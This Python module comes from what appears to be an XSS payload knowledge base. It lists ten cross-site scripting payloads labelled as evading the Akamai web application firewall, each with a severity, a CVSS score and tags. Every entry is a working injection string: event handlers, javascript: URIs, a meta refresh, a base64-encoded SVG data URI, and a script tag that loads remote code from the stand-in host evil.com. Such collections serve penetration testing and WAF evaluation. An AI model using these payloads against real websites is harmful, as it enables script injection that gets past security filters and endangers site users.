#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Akamai WAF Bypass Payloads
"""

from ..models import PayloadEntry


AKAMAI_BYPASS_PAYLOADS = {
    "akamai_bypass_1": PayloadEntry(
        payload="<x/onclick=alert(1)>click me",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Custom tag with onclick",
        tags=["akamai", "custom-tag", "onclick"],
        waf_evasion=True,
        bypasses=["akamai"],
        reliability="medium",
    ),
    "akamai_bypass_2": PayloadEntry(
        payload="<svg><x><rect/onclick=alert(1)></x></svg>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="SVG nested custom element",
        tags=["akamai", "svg", "custom-element"],
        waf_evasion=True,
        bypasses=["akamai"],
        reliability="medium",
    ),
    "akamai_bypass_3": PayloadEntry(
        payload="<math><x><maction onclick=alert(1)>click",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="MathML nested with onclick",
        tags=["akamai", "mathml", "onclick"],
        waf_evasion=True,
        bypasses=["akamai"],
        browser_support=["firefox"],
        reliability="medium",
    ),
    "akamai_bypass_4": PayloadEntry(
        payload="<form><button formaction=javascript:alert(1)>click",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Button formaction javascript",
        tags=["akamai", "form", "formaction"],
        waf_evasion=True,
        bypasses=["akamai"],
        reliability="high",
    ),
    "akamai_bypass_5": PayloadEntry(
        payload="<isindex action=javascript:alert(1) type=submit>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Deprecated isindex with javascript action",
        tags=["akamai", "isindex", "deprecated"],
        waf_evasion=True,
        bypasses=["akamai"],
        reliability="low",
    ),
    "akamai_bypass_6": PayloadEntry(
        payload="<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Meta refresh to javascript",
        tags=["akamai", "meta", "refresh"],
        waf_evasion=True,
        bypasses=["akamai"],
        reliability="medium",
    ),
    "akamai_bypass_7": PayloadEntry(
        payload="<table background=javascript:alert(1)>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.5,
        description="Table background javascript (old IE)",
        tags=["akamai", "table", "background", "legacy"],
        waf_evasion=True,
        bypasses=["akamai"],
        browser_support=["ie"],
        reliability="low",
    ),
    "akamai_bypass_8": PayloadEntry(
        payload="<script src=//evil.com/x.js>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Protocol-relative script src",
        tags=["akamai", "script", "external"],
        waf_evasion=True,
        bypasses=["akamai"],
        reliability="medium",
    ),
    "akamai_bypass_9": PayloadEntry(
        payload="<embed src=javascript:alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Embed with javascript src",
        tags=["akamai", "embed", "javascript"],
        waf_evasion=True,
        bypasses=["akamai"],
        reliability="medium",
    ),
    "akamai_bypass_10": PayloadEntry(
        payload="<svg><use xlink:href=data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=#x />",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="SVG use with base64 data URI",
        tags=["akamai", "svg", "use", "xlink", "base64"],
        waf_evasion=True,
        bypasses=["akamai", "cloudflare"],
        reliability="medium",
    ),
}

AKAMAI_BYPASS_PAYLOADS_TOTAL = len(AKAMAI_BYPASS_PAYLOADS)
